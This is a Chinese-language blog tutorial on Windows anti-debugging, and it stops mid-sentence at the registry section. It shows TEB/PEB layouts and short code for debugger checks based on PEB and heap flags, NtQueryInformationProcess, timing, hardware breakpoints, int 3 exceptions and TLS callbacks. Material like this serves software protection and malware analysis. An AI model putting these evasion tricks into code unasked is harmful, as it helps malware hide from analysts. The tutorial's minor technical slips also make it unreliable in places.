<p><strong>调试技术</strong>可以直接探查出程序运行的机制，程序作者为了隐藏程序底层机制而通过<strong>反调试技术</strong>来反制。</p>
<p>对于一般的程序需要防止核心代码被调试逆向，软件或专利技术被破解；而病毒或恶意代码会隐藏自己的恶意行为防止被跟踪。</p>
<p>所以对于<strong>反调试技术</strong>我们是有了解的必要的。</p>
<h1 id="windows-前置知识">Windows 前置知识</h1>
<p>以下存在未公开结构体 (地址为 32 位，具体请参考微软官方文档)</p>
<h2 id="teb-线程环境块">TEB 线程环境块</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TEB</span></span><br><span class="line">&#123;</span><br><span class="line">    NT_TIB Tib;                             <span class="comment">/* 00h */</span></span><br><span class="line">    PVOID EnvironmentPointer;               <span class="comment">/* 1Ch */</span></span><br><span class="line">    CLIENT_ID Cid;                          <span class="comment">/* 20h */</span></span><br><span class="line">    PVOID ActiveRpcHandle;                  <span class="comment">/* 28h */</span></span><br><span class="line">    PVOID ThreadLocalStoragePointer;        <span class="comment">/* 2Ch */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_PEB</span> *ProcessEnvironmentBlock;   <span class="comment">/* 30h */</span></span><br><span class="line">    ULONG LastErrorValue;                   <span class="comment">/* 34h */</span></span><br><span class="line">    ULONG CountOfOwnedCriticalSections;     <span class="comment">/* 38h */</span></span><br><span class="line">    PVOID CsrClientThread;                  <span class="comment">/* 3Ch */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_W32THREAD</span>* Win32ThreadInfo;     <span class="comment">/* 40h */</span></span><br><span class="line">    ULONG User32Reserved[<span class="number">0x1A</span>];             <span class="comment">/* 44h */</span></span><br><span class="line">    ULONG UserReserved[<span class="number">5</span>];                  <span class="comment">/* ACh */</span></span><br><span class="line">    PVOID WOW32Reserved;                    <span class="comment">/* C0h */</span></span><br><span class="line">    LCID CurrentLocale;                     <span class="comment">/* C4h */</span></span><br><span class="line">    ULONG FpSoftwareStatusRegister;         <span class="comment">/* C8h */</span></span><br><span class="line">    PVOID SystemReserved1[<span class="number">0x36</span>];            <span class="comment">/* CCh */</span></span><br><span class="line">    LONG ExceptionCode;                     <span class="comment">/* 1A4h */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_ACTIVATION_CONTEXT_STACK</span> *ActivationContextStackPointer; <span class="comment">/* 1A8h */</span></span><br><span class="line">    UCHAR SpareBytes1[<span class="number">0x28</span>];                <span class="comment">/* 1ACh */</span></span><br><span class="line">    GDI_TEB_BATCH GdiTebBatch;              <span class="comment">/* 1D4h */</span></span><br><span class="line">    CLIENT_ID RealClientId;                 <span class="comment">/* 6B4h */</span></span><br><span class="line">    PVOID GdiCachedProcessHandle;           <span class="comment">/* 6BCh */</span></span><br><span class="line">    ULONG GdiClientPID;                     <span class="comment">/* 6C0h */</span></span><br><span class="line">    ULONG GdiClientTID;                     <span class="comment">/* 6C4h */</span></span><br><span class="line">    PVOID GdiThreadLocalInfo;               <span class="comment">/* 6C8h */</span></span><br><span class="line">    ULONG Win32ClientInfo[<span class="number">62</span>];              <span class="comment">/* 6CCh */</span></span><br><span class="line">    PVOID glDispatchTable[<span class="number">0xE9</span>];            <span class="comment">/* 7C4h */</span></span><br><span class="line">    ULONG glReserved1[<span class="number">0x1D</span>];                <span class="comment">/* B68h */</span></span><br><span class="line">    PVOID glReserved2;                      <span class="comment">/* BDCh */</span></span><br><span class="line">    PVOID glSectionInfo;                    <span class="comment">/* BE0h */</span></span><br><span class="line">    PVOID glSection;                        <span class="comment">/* BE4h */</span></span><br><span class="line">    PVOID glTable;                          <span class="comment">/* BE8h */</span></span><br><span class="line">    PVOID glCurrentRC;                      <span class="comment">/* BECh */</span></span><br><span class="line">    PVOID glContext;                        <span class="comment">/* BF0h */</span></span><br><span class="line">    NTSTATUS LastStatusValue;               <span class="comment">/* BF4h */</span></span><br><span class="line">    UNICODE_STRING StaticUnicodeString;     <span class="comment">/* BF8h */</span></span><br><span class="line">    WCHAR StaticUnicodeBuffer[<span class="number">0x105</span>];       <span class="comment">/* C00h */</span></span><br><span class="line">    PVOID DeallocationStack;                <span class="comment">/* E0Ch */</span></span><br><span class="line">    PVOID TlsSlots[<span class="number">0x40</span>];                   <span class="comment">/* E10h */</span></span><br><span class="line">    LIST_ENTRY TlsLinks;                    <span class="comment">/* F10h */</span></span><br><span class="line">    PVOID Vdm;                              <span class="comment">/* F18h */</span></span><br><span class="line">    PVOID ReservedForNtRpc;                 <span class="comment">/* F1Ch */</span></span><br><span class="line">    PVOID DbgSsReserved[<span class="number">0x2</span>];               <span class="comment">/* F20h */</span></span><br><span class="line">    ULONG HardErrorDisabled;                <span class="comment">/* F28h */</span></span><br><span class="line">    PVOID Instrumentation[<span class="number">14</span>];              <span class="comment">/* F2Ch */</span></span><br><span class="line">    PVOID SubProcessTag;                    <span class="comment">/* F64h */</span></span><br><span class="line">    PVOID EtwTraceData;                     <span class="comment">/* F68h */</span></span><br><span class="line">    PVOID WinSockData;                      <span class="comment">/* F6Ch */</span></span><br><span class="line">    ULONG GdiBatchCount;                    <span class="comment">/* F70h */</span></span><br><span class="line">    BOOLEAN InDbgPrint;                     <span class="comment">/* F74h */</span></span><br><span class="line">    BOOLEAN FreeStackOnTermination;         <span class="comment">/* F75h */</span></span><br><span class="line">    BOOLEAN HasFiberData;                   <span class="comment">/* F76h */</span></span><br><span class="line">    UCHAR IdealProcessor;                   <span class="comment">/* F77h */</span></span><br><span class="line">    ULONG GuaranteedStackBytes;             <span class="comment">/* F78h */</span></span><br><span class="line">    PVOID ReservedForPerf;                  <span class="comment">/* F7Ch */</span></span><br><span class="line">    PVOID ReservedForOle;                   <span class="comment">/* F80h */</span></span><br><span class="line">    ULONG WaitingOnLoaderLock;              <span class="comment">/* F84h */</span></span><br><span class="line">    ULONG SparePointer1;                    <span class="comment">/* F88h */</span></span><br><span class="line">    ULONG SoftPatchPtr1;                    <span class="comment">/* F8Ch */</span></span><br><span class="line">    ULONG SoftPatchPtr2;                    <span class="comment">/* F90h */</span></span><br><span class="line">    PVOID *TlsExpansionSlots;               <span class="comment">/* F94h */</span></span><br><span class="line">    ULONG ImpersionationLocale;             <span class="comment">/* F98h */</span></span><br><span class="line">    ULONG IsImpersonating;                  <span class="comment">/* F9Ch */</span></span><br><span class="line">    PVOID NlsCache;                         <span class="comment">/* FA0h */</span></span><br><span class="line">    PVOID pShimData;                        <span class="comment">/* FA4h */</span></span><br><span class="line">    ULONG HeapVirualAffinity;               <span class="comment">/* FA8h */</span></span><br><span class="line">    PVOID CurrentTransactionHandle;         <span class="comment">/* FACh */</span></span><br><span class="line">    PTEB_ACTIVE_FRAME ActiveFrame;          <span class="comment">/* FB0h */</span></span><br><span class="line">    PVOID FlsData;                          <span class="comment">/* FB4h */</span></span><br><span class="line">    UCHAR SafeThunkCall;                    <span class="comment">/* FB8h */</span></span><br><span class="line">    UCHAR BooleanSpare[<span class="number">3</span>];                  <span class="comment">/* FB9h */</span></span><br><span class="line">&#125; TEB, *PTEB;</span><br></pre></td></tr></table></figure>
<h2 id="peb-进程环境块">PEB 进程环境块</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span></span><br><span class="line">&#123;</span><br><span class="line">    UCHAR InheritedAddressSpace; 			<span class="comment">/*  00h */</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions; 		<span class="comment">/*  01h */</span></span><br><span class="line">    UCHAR BeingDebugged; 			        <span class="comment">/*  02h */</span></span><br><span class="line">    UCHAR Spare; 			                <span class="comment">/*  03h */</span></span><br><span class="line">    PVOID Mutant; 		                	<span class="comment">/*  04h */</span></span><br><span class="line">    PVOID ImageBaseAddress; 	    		<span class="comment">/*  08h */</span></span><br><span class="line">    PPEB_LDR_DATA Ldr; 		               	<span class="comment">/*  0Ch */</span></span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters; 			<span class="comment">/*  10h */</span></span><br><span class="line">    PVOID SubSystemData; 		           	<span class="comment">/*  14h */</span></span><br><span class="line">    PVOID ProcessHeap; 			            <span class="comment">/*  18h */</span></span><br><span class="line">    PVOID FastPebLock; 		            	<span class="comment">/*  1Ch */</span></span><br><span class="line">    PPEBLOCKROUTINE FastPebLockRoutine; 	<span class="comment">/*  20h */</span></span><br><span class="line">    PPEBLOCKROUTINE FastPebUnlockRoutine;	<span class="comment">/*  24h */</span></span><br><span class="line">    ULONG EnvironmentUpdateCount; 			<span class="comment">/*  28h */</span></span><br><span class="line">    PVOID* KernelCallbackTable; 			<span class="comment">/*  2Ch */</span></span><br><span class="line">    PVOID EventLogSection; 		        	<span class="comment">/*  30h */</span></span><br><span class="line">    PVOID EventLog; 		            	<span class="comment">/*  34h */</span></span><br><span class="line">    PPEB_FREE_BLOCK FreeList; 		    	<span class="comment">/*  38h */</span></span><br><span class="line">    ULONG TlsExpansionCounter; 		    	<span class="comment">/*  3Ch */</span></span><br><span class="line">    PVOID TlsBitmap; 			            <span class="comment">/*  40h */</span></span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">0x2</span>]; 		    	<span class="comment">/*  44h */</span></span><br><span class="line">    PVOID ReadOnlySharedMemoryBase; 		<span class="comment">/*  4Ch */</span></span><br><span class="line">    PVOID ReadOnlySharedMemoryHeap; 		<span class="comment">/*  50h */</span></span><br><span class="line">    PVOID* ReadOnlyStaticServerData; 		<span class="comment">/*  54h */</span></span><br><span class="line">    PVOID AnsiCodePageData; 		    	<span class="comment">/*  58h */</span></span><br><span class="line">    PVOID OemCodePageData; 		        	<span class="comment">/*  5Ch */</span></span><br><span class="line">    PVOID UnicodeCaseTableData; 			<span class="comment">/*  60h */</span></span><br><span class="line">    ULONG NumberOfProcessors; 		    	<span class="comment">/*  64h */</span></span><br><span class="line">    ULONG NtGlobalFlag; 		        	<span class="comment">/*  68h */</span></span><br><span class="line">    UCHAR Spare2[<span class="number">0x4</span>]; 		            	<span class="comment">/*  6Ch */</span></span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout; 	<span class="comment">/*  70h */</span></span><br><span class="line">    ULONG HeapSegmentReserve; 		    	<span class="comment">/*  78h */</span></span><br><span class="line">    ULONG HeapSegmentCommit; 		    	<span class="comment">/*  7Ch */</span></span><br><span class="line">    ULONG HeapDeCommitTotalFreeThreshold; 	<span class="comment">/*  80h */</span></span><br><span class="line">    ULONG HeapDeCommitFreeBlockThreshold; 	<span class="comment">/*  84h */</span></span><br><span class="line">    ULONG NumberOfHeaps; 		        	<span class="comment">/*  88h */</span></span><br><span class="line">    ULONG MaximumNumberOfHeaps; 			<span class="comment">/*  8Ch */</span></span><br><span class="line">    PVOID** ProcessHeaps; 			        <span class="comment">/*  90h */</span></span><br><span class="line">    PVOID GdiSharedHandleTable; 			<span class="comment">/*  94h */</span></span><br><span class="line">    PVOID ProcessStarterHelper; 			<span class="comment">/*  98h */</span></span><br><span class="line">    PVOID GdiDCAttributeList; 		    	<span class="comment">/*  9Ch */</span></span><br><span class="line">    PVOID LoaderLock; 		            	<span class="comment">/*  A0h */</span></span><br><span class="line">    ULONG OSMajorVersion; 			        <span class="comment">/*  A4h */</span></span><br><span class="line">    ULONG OSMinorVersion; 			        <span class="comment">/*  A8h */</span></span><br><span class="line">    ULONG OSBuildNumber; 			        <span class="comment">/*  ACh */</span></span><br><span class="line">    ULONG OSPlatformId; 			        <span class="comment">/*  B0h */</span></span><br><span class="line">    ULONG ImageSubSystem; 			        <span class="comment">/*  B4h */</span></span><br><span class="line">    ULONG ImageSubSystemMajorVersion; 		<span class="comment">/*  B8h */</span></span><br><span class="line">    ULONG ImageSubSystemMinorVersion; 		<span class="comment">/*  C0h */</span></span><br><span class="line">    ULONG GdiHandleBuffer[<span class="number">0x22</span>]; 			<span class="comment">/*  C4h */</span></span><br><span class="line">    PVOID ProcessWindowStation; 			<span class="comment">/*  ??? */</span></span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure>
<h2 id="tls-线程局部存储">TLS 线程局部存储</h2>
<p>线程局部存储用来将数据与一个正在执行的指定线程关联起来。</p>
<p>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p>
<h1 id="winapi-反调试">WinAPI 反调试</h1>
<p>在头文件 <code>windows.h</code> 中存在函数
<code>IsDebuggerPresent()</code></p>
<p>当函数返回 <code>true</code> 代表检测到调试器，<code>false</code>
则代表未检测到调试器</p>
<p>相同功能的函数还有 <code>CheckRemoteDebuggerPresent()</code></p>
<p>同时还可以通过
<code>FindWindow</code>、<code>EnumWindows</code>或是<code>GetForegroundWindow</code>粗暴查询主流调试器窗口名</p>
<p>又或者通过
<code>CreateToolhelp32Snapshot</code>、<code>Process32First</code>和<code>Process32Next</code>查询所有的进程来排查主流调试器进程是否存在</p>
<p>甚至可以通过判断父进程是否为<code>explorer.exe</code>来检查是否被调试，因为一般来说双击点开的程序的父进程都是<code>explorer.exe</code></p>
<h1 id="利用-peb-标志位">利用 PEB 标志位</h1>
<p><code>IsDebuggerPresent()</code> 实际上也是取 <code>PEB</code>
结构体中的 <code>BeingDebugged</code> 标志位</p>
<p>当调试器开始调试应用程序的时候，操作系统会将目标应用程序的
<code>PEB</code> 结构体中的 <code>BeingDebugged</code> 标志位置为 1</p>
<p>而 <code>FS[]</code> 寄存器指向 <code>TEB</code> 结构体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, fs:[30h]		; 取 PEB 首地址</span><br><span class="line">mov eax, [eax+2]		; 取 PEB 首地址偏移 2 的位置</span><br><span class="line">and eax, 0xff			; 只需要低 2 位的 PEB-&gt;BeingDebugged</span><br></pre></td></tr></table></figure>
<p>或者 (<code>NtGlobalFlag</code> 默认为 0 )</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, fs:[30h]		; 取 PEB 首地址</span><br><span class="line">mov eax, [eax+68h]		; 取 PEB 首地址偏移 68h 的位置，即 PEB-&gt;NtGlobalFlag</span><br></pre></td></tr></table></figure>
<p>在 C++ 中可写为 (仅为示例)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flag = <span class="literal">false</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs:[<span class="number">30</span>h]</span><br><span class="line">        mov eax, [eax+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">and</span> eax, <span class="number">0xff</span></span><br><span class="line">        mov flag, eax</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="利用堆标志位">利用堆标志位</h1>
<p>不同系统、不同版本可能不太一样，具体请查询微软官方文档。</p>
<p>在Windows
XP系统中，<code>ForceFlags</code>属性位于堆头部偏移量0x10处；在Windows
7系统中，对于32位的应用程序来说<code>ForceFlags</code>属性位于堆头部偏移量
0x44 处。</p>
<p>利用 <code>PEB-&gt;ProcessHeap-&gt;Flags</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, fs:[30h]		; 取 PEB 首地址</span><br><span class="line">mov eax, [eax + 18h]	; 取 PEB 首地址偏移 18h 的位置，即 PEB-&gt;ProcessHeap</span><br><span class="line">mov eax, [eax + 0ch]	; 取 PEB-&gt;ProcessHeap 首地址偏移 0ch 的位置，即 PEB-&gt;ProcessHeap-&gt;Flags (默认为 2)</span><br></pre></td></tr></table></figure>
<p>利用 <code>PEB-&gt;ProcessHeap-&gt;ForceFlags</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, fs:[30h]		; 取 PEB 首地址</span><br><span class="line">mov eax, [eax + 18h]	; 取 PEB 首地址偏移 18h 的位置，即 PEB-&gt;ProcessHeap</span><br><span class="line">mov eax, [eax + 10h]	; 取 PEB-&gt;ProcessHeap 首地址偏移 0ch 的位置，即 PEB-&gt;ProcessHeap-&gt;ForceFlags</span><br></pre></td></tr></table></figure>
<h1 id="使用-ntdll-函数">使用 ntdll 函数</h1>
<p>无论是 <code>kernel32.dll</code> 还是
<code>user32.dll</code>，始终会通过 <code>ntdll.dll</code>
中的函数与驱动层取得联系</p>
<p>其中 <code>ntdll.dll</code> 存在一个<strong>未导出函数</strong>
<code>NtQueryInformationProcess()</code> 可供查询调试端口</p>
<p>定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">DWORD NTAPI <span class="title">NtQueryInformationProcess</span><span class="params">(HANDLE hProcess, ULONG InfoClass, PVOID Buffer, ULONG length, PULONG returnLen)</span></span>;</span><br></pre></td></tr></table></figure>
<p>当我们需要使用时，以下 MSVC 代码可供参考：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">DWORD NTAPI <span class="title">NtQueryInformationProcess</span><span class="params">(HANDLE hProcess, ULONG InfoClass, PVOID Buffer, ULONG length, PULONG returnLen)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdll.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDebugPort = <span class="literal">NULL</span>;	<span class="comment">// 调试端口</span></span><br><span class="line">    <span class="comment">// (HANDLE)-1 代表当前进程，其他均为查询是否被调试的固定参数</span></span><br><span class="line">	<span class="comment">// 如果正在被调试将返回 -1，否则返回 0</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">NtQueryInformationProcess</span>((HANDLE)<span class="number">-1</span>, <span class="number">7</span>, &amp;hDebugPort, <span class="built_in">sizeof</span>(HANDLE), <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> hDebugPort;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>CheckRemoteDebuggerPresent()</code>
实际上内部也调用了此函数</p>
<h1 id="时间检测">时间检测</h1>
<p>利用时间差判断是否代码停留时间过长，可判断是否在被动态调试，适合放在关键代码处运行，从某种意义上可以反制一定的调试手段</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD start, end;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		rdtsc</span><br><span class="line">		mov start, eax</span><br><span class="line">		rdtsc</span><br><span class="line">		mov end, eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (end - start &gt; <span class="number">21</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 时间较长则视为在被调试</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">keyFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD start, end;</span><br><span class="line">	start = <span class="built_in">GetTickCount</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 部分代码</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	end = <span class="built_in">GetTickCount</span>();</span><br><span class="line">	<span class="keyword">if</span> (end - start &gt; <span class="number">100</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 如果运行时间大于理想时间，则说明在调试中</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * 其他代码</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="硬件断点检测">硬件断点检测</h1>
<p>获取线程上下文，检测硬件断点，查看是否占用</p>
<p>以下 MSVC 代码可供参考：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">	<span class="built_in">GetThreadContext</span>((HANDLE)<span class="number">-1</span>, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="异常检测">异常检测</h1>
<p>但当调试器捕获异常时，大多数调试器并不会立即将异常传递给被调试程序处理或是直接不传递。我们便可以将这种机制用来反调试。</p>
<blockquote>
<p>但以下代码不一定运行成功——时代在发展，科技在进步。</p>
</blockquote>
<h2 id="一个字节的-interrupt-3-中断">一个字节的 Interrupt 3 中断</h2>
<p>在所有会被调试器处理的异常中，interrupt 3
中断算是一个，它会生成一个单字节的断点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged_Int3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	&#125;</span><br><span class="line">	__except (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="两个字节的-interrupt-3-中断">两个字节的 Interrupt 3 中断</h2>
<p>使用 MSVC 内联汇编器的 <code>_emit</code>
伪指令可以生成一个两字节的interrupt 3指令。在测试的所有调试器中，只有
OnllyDbg 调试器识别这个异常。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged_Int3_2Bytes</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		__asm</span><br><span class="line">		&#123;</span><br><span class="line">			__emit <span class="number">0xCD</span></span><br><span class="line">			__emit <span class="number">0x03</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="interrupt-0x2d-中断">Interrupt 0x2D 中断</h2>
<p>如果执行了interrupt 0x2D，Windows将抛出一个断点异常</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged_Int2d</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		__asm <span class="type">int</span> <span class="number">0x2d</span></span><br><span class="line">	&#125;</span><br><span class="line">	__except (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="getlasterror-检测">GetLastError 检测</h2>
<p>当出现异常时，winapi 往往会通过 <code>GetLastError()</code>
函数获取错误原因，而我们也可以通过 <code>SetLastError()</code>
来报错</p>
<p>其中 <code>OutputDebugString()</code>
函数用于在调试器中显示字符串，同时可以用来探测调试器是否存在。</p>
<p>我们可以通过将错误码重置，当使用 <code>OutputDebugString()</code>
函数时，若不存在调试器，则会发生错误，错误码被重新设置；若存在调试器，则之后的错误码则会跟我们重置的错误码相同，以此便可以判断调试器存在。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDebugged</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwCode = <span class="number">10086</span>;</span><br><span class="line">	<span class="built_in">SetLastError</span>(dwCode);</span><br><span class="line">	<span class="built_in">OutputDebugString</span>(<span class="string">L&quot;hacker!&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == dwCode)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="利用-tls-回调">利用 TLS 回调</h1>
<p>以下 MSVC 代码可供参考：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自定义 TLS 回调函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">tls_callback</span><span class="params">(PVOID h, DWORD reason, PVOID pv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">IsDebuggerPresent</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;hacker!&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是 x86 还是 x64 系统</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _M_IX86</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span>  comment(linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span>  comment(linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span>  comment(linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span>  comment(linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 TLS 区段</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _M_X64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">PIMAGE_TLS_CALLBACK _tls_callback[] = &#123; tls_callback, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">// 结束区段</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _M_X64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>我们可以在 TLS 回调函数中，进行我们的反调试手段，如加壳、加密等</p>
<h1 id="内存校验">内存校验</h1>
<p>将内存值进行 hash 得到哈希值 (如 CRC
算法等)，当内存区段数据被调试，或者是被补丁后，内存值经过同一哈希函数得到的哈希值会发生改变，可以此来判断是否被调试。</p>
<h1 id="注册表查询检测">注册表查询检测</h1>
<p>以下为调试器在注册表中的一个常用位置。 32位系统:
